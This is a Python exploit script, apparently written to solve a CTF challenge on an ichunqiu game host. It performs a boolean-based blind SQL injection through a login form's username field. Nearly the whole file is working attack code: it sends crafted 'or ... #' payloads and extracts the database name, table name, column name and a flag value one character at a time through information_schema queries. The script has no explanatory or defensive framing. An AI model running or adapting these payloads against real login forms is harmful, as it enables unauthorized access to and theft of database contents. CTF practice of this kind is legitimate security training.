import requests
import string
import binascii

def get_database_len():
    for i in range(30):
        key = "admin%1$\\' or " + "length(database())=" + str(i) + "#"
        data = {'username': key, 'password': '123'}
        r = requests.post(url, data=data)
        if right in r.content.decode():
            print("the length of the database is " + str(i))
            return i

def get_database_name(database_len):
    database_name = ''
    for i in range(0, database_len + 1):
        for ele in (string.ascii_letters + string.digits):
            key = "admin%1$\\' or " + "ascii(substr(database(),{},1))=".format(i) + str(ord(ele)) + "#"
            data = {'username': key, 'password': '1234'}
            r = requests.post(url, data=data)
            if right in r.content.decode():
                database_name += ele
                if len(database_name) == 3:
                    break
    print("the database name is " + database_name)
    return database_name

def get_table_len():
    for i in range(100):
        key = "admin%1$\\' or " + "(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=" + str(i) + "#"
        data = {'username': key, 'password': '123441'}
        r = requests.post(url, data=data)
        if right in r.content.decode():
            print("the length of the table is " + str(i))
            break
    return i

def get_table_name():
    table_name = ''
    for i in range(0, table_len + 1):
        for ele in (string.ascii_letters):
            key = "admin%1$\\' or " + "ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{},1))=".format(i) + str(ord(ele)) + "#"
            data = {'username': key, 'password': '12345'}
            r = requests.post(url, data=data)
            if right in r.content.decode():
                table_name += ele
                if len(table_name) == table_len:
                    print("the table name is " + table_name)
                    break
    return table_name

def get_column_len():
    for i in range(100):
        key = "admin%1$\\' or " + "(select length(column_name) from information_schema.columns where table_name = 0x" + table_name.encode('utf-8').hex() + " limit 0,1)=" + str(i) + "#"
        data = {'username': key, 'password': '1341234'}
        r = requests.post(url, data=data)
        if right in r.content.decode():
            print("the column length is " + str(i))
            break
    return i

def get_column_name():
    column_name = ''
    print(column_len)
    for i in range(column_len + 1):
        for ele in string.ascii_letters:
            key = "admin%1$\\' or " + "ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=0x{} limit 0,1),{},1))=".format(table_name.encode('utf-8').hex(),i) + str(ord(ele)) + "#"
            print(key)
            data = {'username': key, 'password': '141341'}
            r = requests.post(url, data= data)
            if right in r.content.decode():
                column_name += ele
                print(ele)
                if len(column_name) == column_len:
                    print('the column name is ' + column_name)
                    break
    return column_name

def get_data_len():
    for i in range(100):
        key = "admin%1$\\' or " + "(select length(flag) from flag limit 0,1)=" + str(i) + "#"
        data = {'username': key, 'password': '134134'}
        r = requests.post(url, data=data)
        if right in r.content.decode():
            print('the length of data is ' + str(i))
            break
    return i

def get_data():
    flag = ''
    for i in range(data_len + 1):
        for ele in dic:
            key = "admin%1$\\' or " + "ascii(substr((select flag from ctf.flag limit 0,1),{},1))=".format(i) + str(ord(ele)) + "#"
            print(key)
            data = {'username': key, 'password': '134134'}
            r = requests.post(url,data=data)
            if right in r.content.decode():
                flag += ele
                print(ele)
                if len(flag) == data_len:
                    print('the flag is: ' + flag)
                    break
    return flag


if __name__ == '__main__':
    url = "http://79d7de1f17b84563b3f86bce45c09583ca58e1d626964cb4.game.ichunqiu.com/"
    right = "password error!"
    wrong = "uasername error!"
    dic = string.digits + string.ascii_letters + "!@#$%^&*()_+{}-="
    database_len = get_database_len()
    database_name = get_database_name(database_len)
    table_len = get_table_len()
    table_name = get_table_name()
    column_len = get_column_len()
    column_name = get_column_name()
    data_len = get_data_len()
    data = get_data()


